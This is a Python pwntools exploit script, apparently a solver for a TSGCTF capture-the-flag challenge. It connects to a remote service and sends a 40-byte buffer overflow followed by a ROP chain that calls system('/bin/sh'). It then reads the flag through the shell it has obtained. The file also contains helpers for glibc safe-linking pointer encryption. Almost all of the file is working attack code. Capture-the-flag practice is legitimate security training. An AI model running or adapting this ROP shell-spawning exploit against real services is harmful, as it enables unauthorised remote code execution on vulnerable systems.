from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.arch = 'amd64'
context.log_level = 'error'

host = sys.argv[1]
port = int(sys.argv[2])

is_gaibu = True
log = False

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, b'\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    if type(x) == str:
        x = x.encode("ascii")
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip(b'\n')

def sendline(s, verbose=True):
    if type(s) == str:
        s = s.encode("ascii")
    if log and verbose:
        print(s)
    r.sendline(s)

def send(s, verbose=True):
    if type(s) == str:
        s = s.encode("ascii")
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()


# libc safe linking decrypt
def decrypt(cipher):
    key = 0
    plain  = 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain

def encrypt(val, addr):
    return val ^ (addr >> 12)


####################################

def menu(choice):
    recvuntil(b':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=b': '):
    recvuntil(r)
    #s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

# send `s` after r
def sa(r, s, new_line=True):
    rs(s, new_line, r)


system_addr = 0x1012c960
binsh = 0x10270563
pop_rdi = 0x10009132
ret = pop_rdi + 1

padding = b"A" * 40

payload = [
    ret,
    pop_rdi,
    binsh,
    system_addr,
]

payload = padding + b''.join(map(p64, payload))

wait_for_attach()
sendline(payload)
#interactive()
import time
time.sleep(1)
sendline("cat flag*; echo")
sendline("cat flag*; echo")
recvline()
s = recvline()
if s.startswith(b"TSGCTF{"):
    print(s)
    exit(0)
else:
    exit(1)

#interactive()
